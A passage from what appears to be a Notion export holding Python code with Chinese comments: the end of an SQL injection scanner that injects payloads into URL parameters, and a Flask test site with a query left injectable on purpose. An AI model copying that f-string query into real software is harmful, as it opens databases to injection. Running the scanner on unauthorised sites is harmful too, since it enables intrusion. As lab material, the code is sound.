\n        for p in query.split('\u0026'):\n            if p.startswith(f\"{param}=\"):\n                new_params.append(f\"{param}={encoded_payload}\")\n                param_found = True\n            else:\n                new_params.append(p)\n        \n        if not param_found:\n            new_params.append(f\"{param}={encoded_payload}\")\n        \n        return f\"{base_url}?{'\u0026'.join(new_params)}\"\n\n    def _analyze_results(self, results: List[VulnResult]) -\u003e List[VulnResult]:\n        # 去重和结果分析\n        unique_results = {}\n        for result in results:\n            key = f\"{result.type}_{result.parameter}\"\n            if key not in unique_results:\n                unique_results[key] = result\n            \n        return list(unique_results.values())\n\ndef main():\n    scanner = SQLInjectionScanner()\n    url = input(\"请输入要扫描的URL: \")\n    \n    if not url.startswith(('http://', 'https://')):\n        url = 'http://' + url\n    \n    results = scanner.scan_url(url)\n    \n    if results:\n        print(\"\\n[!] 扫描报告\")\n        print(\"=\" * 50)\n        \n        for i, result in enumerate(results, 1):\n            print(f\"\\n漏洞 #{i}\")\n            print(f\"类型: {result.type.value}\")\n            print(f\"参数: {result.parameter}\")\n            print(f\"描述: {result.descriptio in-top: 20px; }\n    \u003c/style\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n    \u003ch2\u003e用户搜索\u003c/h2\u003e\n    \u003cform method=\"GET\"\u003e\n        \u003cinput type=\"text\" name=\"username\" placeholder=\"输入用户名\"\u003e\n        \u003cinput type=\"submit\" value=\"搜索\"\u003e\n    \u003c/form\u003e\n    \u003cdiv class=\"result\"\u003e\n        {% if error %}\n            \u003cp style=\"color: red;\"\u003e{{ error }}\u003c/p\u003e\n        {% endif %}\n        {% if result %}\n            \u003cp\u003e查询结果: {{ result }}\u003c/p\u003e\n        {% endif %}\n    \u003c/div\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n'''\n\n@app.route('/')\ndef index():\n    username = request.args.get('username', '')\n    if username:\n        try:\n            conn = sqlite3.connect('test.db')\n            c = conn.cursor()\n            # 故意使用不安全的查询方式\n            query = f\"SELECT * FROM users WHERE username = '{username}'\"\n            c.execute(query)\n            result = c.fetchall()\n            conn.close()\n            return render_template_string(TEMPLATE, result=result)\n        except Exception as e:\n            return render_template_string(TEMPLATE, error=str(e))\n    return render_template_string(TEMPLATE)\n\nif __name__ == '__main__':\n    init_db()\n    app.run(debug=True, port=5000)"]],"language":[["Python"]]},"created_time":1733965211022,"last_edited_time":1733965239812,"parent_id":"14a99968-1bdb-80ba-b3cb-eab23bfe6b1a","parent_table":"block","alive":true,"space_id":"dcfc0b10-f3f6-4bfe-a7f8-895b46badeca","crdt_format_version":1,"crdt_data":{"title":{"r":"aqYNd_x1F9Qoi1JiYrSKZg,\"start\",\"end\"","n":{"aqYNd_x1F9Qoi1JiYrSKZg,\"start\",\"end\"":{"s":{"x":"aqYNd_x1F9Qoi1JiYrSKZg","i":[{"t":"s"},{"t":"t","i":["vNREj4V9d0oN",1],"o":"start","l":1775,"c":"#测试网站范例\nfrom flask import Flask, request, render_template_string\nimport sqlite3\nimport os\n\napp = Flask(__name__)\n\n# 创建数据库和测试数据\ndef init_db():\n    conn = sqlite3.connect('test.db')\n    c = conn.c
